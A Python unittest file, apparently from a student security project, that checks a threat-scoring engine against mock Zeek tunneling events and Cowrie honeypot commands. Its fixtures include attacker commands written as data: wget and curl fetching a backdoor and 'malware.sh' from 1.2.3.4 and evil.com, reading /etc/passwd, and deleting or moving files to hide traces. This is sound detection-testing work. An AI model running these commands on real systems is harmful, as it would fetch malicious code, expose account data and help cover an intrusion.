import sys
import os
import unittest
import logging

sys.path.append(os.getcwd())

try:
    from analyzer.attack_analyzer.context_engine import ContextEngine
except ImportError:
    print("❌ 无法导入 ContextEngine")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(message)s')

class MockESClient:
    def __init__(self): self.es = None

class TestNetworkCollectorFinal(unittest.TestCase):
    """
    组员2 (网络与蜜罐) 100% 覆盖率验证套件
    严格对照《组员2交付文档》中的每一个演示命令
    """
    
    def setUp(self):
        self.engine = ContextEngine(MockESClient())
        print("\n" + "="*80)

    def _verify(self, category, case_name, mock_event, min_score, keywords):
        print(f"🧪 [{category}] 测试场景: {case_name}")
        result = self.engine.evaluate_threat(mock_event)
        score = result['score']
        reasons = result['reasons']
        
        print(f"   📊 评分: {score} | 等级: {result['severity'].upper()}")
        print(f"   📝 依据: {reasons}")
        
        try:
            self.assertGreaterEqual(score, min_score, f"分数过低 (预期 >={min_score})")
            if isinstance(keywords, str): keywords = [keywords]
            hit = False
            for k in keywords:
                if any(k.lower() in r.lower() for r in reasons):
                    hit = True
                    break
            if not hit:
                self.fail(f"缺失关键词: {keywords}")
            print("   ✅ [PASS]")
        except AssertionError as e:
            print(f"   ❌ [FAIL] {e}")
            raise e

    # =========================================================================
    # 1. Zeek 网络流量 (补全 HTTP 文件提取)
    # =========================================================================
    
    def test_01_zeek_dns_tunnel(self):
        """场景1: DNS 隧道 (nslookup ...)"""
        event = {
            "event": {"dataset": "zeek.dns", "severity": 7, "category": "network"},
            "detection": {"severity": "high", "confidence": 0.9, "rules": ["DNS Anomaly"]},
            "threat": {"technique": {"name": "DNS Tunneling"}}
        }
        self._verify("Zeek", "DNS 隧道", event, 80, "DNS Tunneling")

    def test_02_zeek_icmp_tunnel(self):
        """场景2: ICMP 隧道 (ping -s 900 ...)"""
        event = {
            "event": {"dataset": "zeek.conn", "severity": 7, "category": "network"},
            "detection": {"severity": "high", "confidence": 0.8},
            "threat": {"technique": {"name": "ICMP Tunneling"}}
        }
        self._verify("Zeek", "ICMP 隧道", event, 80, "ICMP Tunneling")

    def test_03_zeek_http_file(self):
        """[新增] 场景3: HTTP 文件传输 (wget logo.gif)"""
        # 文档: [PROCESS][files.log] ... | 网络传输文件: unknown
        event = {
            "event": {"dataset": "zeek.files", "severity": 3, "category": "file"},
            "file": {"name": "unknown"},
            "message": "网络传输文件: unknown"
        }
        # 预期: 低危日志，不应报错，分数应低于 50
        print(f"🧪 [Zeek] 测试场景: HTTP 文件传输")
        result = self.engine.evaluate_threat(event)
        print(f"   📊 评分: {result['score']}")
        self.assertLess(result['score'], 50, "普通文件传输分数过高")
        print("   ✅ [PASS]")

    # =========================================================================
    # 2. Cowrie 蜜罐 - 工具下载 (补全 curl)
    # =========================================================================

    def test_04_cowrie_wget(self):
        """场景4: 下载工具 (wget)"""
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "wget http://1.2.3.4/backdoor.php"},
            "detection": {"confidence": 1.0}
        }
        self._verify("Cowrie", "恶意下载 (wget)", event, 100, "Honeypot Command")

    def test_05_cowrie_curl(self):
        """[新增] 场景5: 下载工具 (curl)"""
        # 文档: CMD: curl http://evil.com/malware.sh
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "curl http://evil.com/malware.sh"},
            "detection": {"confidence": 1.0}
        }
        self._verify("Cowrie", "恶意下载 (curl)", event, 100, "Honeypot Command")

    # =========================================================================
    # 3. Cowrie 蜜罐 - 信息收集 (补全 whoami)
    # =========================================================================

    def test_06_cowrie_cat_passwd(self):
        """场景6: 读取密码本"""
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "cat /etc/passwd"},
            "detection": {"confidence": 0.9}
        }
        self._verify("Cowrie", "读取 /etc/passwd", event, 100, "Honeypot Command")

    def test_07_cowrie_whoami(self):
        """[新增] 场景7: 身份探测 (whoami)"""
        # 文档: CMD: whoami
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "whoami"},
            "detection": {"confidence": 0.9}
        }
        self._verify("Cowrie", "身份探测 (whoami)", event, 100, "Honeypot Command")

    # =========================================================================
    # 4. Cowrie 蜜罐 - 痕迹清除 (补全 mv)
    # =========================================================================

    def test_08_cowrie_rm(self):
        """场景8: 删除文件 (rm)"""
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "rm /tmp/evidence.txt"},
            "detection": {"confidence": 0.7}
        }
        self._verify("Cowrie", "删除文件 (rm)", event, 100, "Honeypot Command")

    def test_09_cowrie_mv(self):
        """[新增] 场景9: 移动/隐藏文件 (mv)"""
        # 文档: CMD: mv /etc/hosts /tmp/hosts.bak
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "mv /etc/hosts /tmp/hosts.bak"},
            "detection": {"confidence": 0.7}
        }
        self._verify("Cowrie", "移动文件 (mv)", event, 100, "Honeypot Command")

    # =========================================================================
    # 5. Cowrie 蜜罐 - 低危操作 (新增)
    # =========================================================================

    def test_10_cowrie_touch(self):
        """[新增] 场景10: 辅助操作 (touch)"""
        # 文档: CMD: touch /tmp/evidence.txt
        event = {
            "event": {"dataset": "cowrie", "category": "process", "action": "input"},
            "process": {"command_line": "touch /tmp/evidence.txt"},
            "detection": {"confidence": 0.5}
        }
        # 预期: 虽然是低危命令，但在蜜罐里执行也是 Suspicious (80分) 或 Critical (100分)
        # 根据 ContextEngine 逻辑，confidence >= 0.5 就是 HIGH (80)
        self._verify("Cowrie", "辅助操作 (touch)", event, 80, ["Honeypot Suspicious", "Honeypot Command"])

if __name__ == '__main__':
    print("🚀 TraceX 组员2 (网络) 交付文档 100% 覆盖验证...")
    unittest.main(verbosity=0)
